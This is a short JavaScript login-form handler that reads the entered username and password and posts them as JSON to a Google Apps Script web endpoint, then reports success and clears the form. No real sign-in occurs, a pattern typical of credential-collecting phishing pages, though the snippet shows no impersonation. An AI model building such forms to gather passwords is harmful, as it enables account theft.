document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value.trim();
  const status = document.getElementById("status");

  const data = {
    username: username,
    password: password
  };

  fetch("https://script.google.com/macros/library/d/1UzrX4_aB2Q4ufl-JTEkr4-jhJye2MSK95I2xVEkaCXGumwQ7yvV6XEyK/2", {
    method: "POST",
    body: JSON.stringify(data),
    headers: {
      "Content-Type": "application/json"
    }
  })
  .then(response => response.text())
  .then(result => {
    status.textContent = "Form submitted successfully!";
    document.getElementById("loginForm").reset();
  })
  .catch(error => {
    console.error("Error:", error);
    status.textContent = "Failed to submit form.";
  });
});
